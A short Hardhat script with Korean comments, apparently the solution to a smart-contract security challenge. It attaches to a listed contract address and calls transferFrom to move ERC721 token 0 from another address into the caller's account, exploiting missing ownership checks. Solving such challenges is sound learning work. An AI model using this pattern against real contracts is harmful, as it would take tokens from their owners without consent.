const { ethers } = require("hardhat");
const eth = ethers.BigNumber.from(10).pow(18);

async function transferFromERC721tokensol() {
  const [myAccount] = await ethers.getSigners();

  const instance = "0xBE529E8147934225cDf58DB13f8Aae44AF1a7DE4"; // 홈페이지에 나온 컨트랙트 주소

  const MadeERC721tokenProblem = await ethers.getContractFactory(
    "mintERC721tokenSolve"
  ); // 홈페이지에 나와있는 문제 코드
  const madeERC721tokenProblem = MadeERC721tokenProblem.attach(instance); // 배포한거에 홈페이지에 나온 컨트랙트 붙이기

  await madeERC721tokenProblem.transferFrom(
    "0x6bc7c15e8ab846c668c69e41a7254e6fbdd09833",
    myAccount.address,
    0
  );

  console.log("cool");

  //   const result = madeERC721tokenProblem
  //     .connect(myAccount)
  //     .setWeb3ojt(deployAddress);
  //   console.log(result);
}

async function main() {
  transferFromERC721tokensol();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
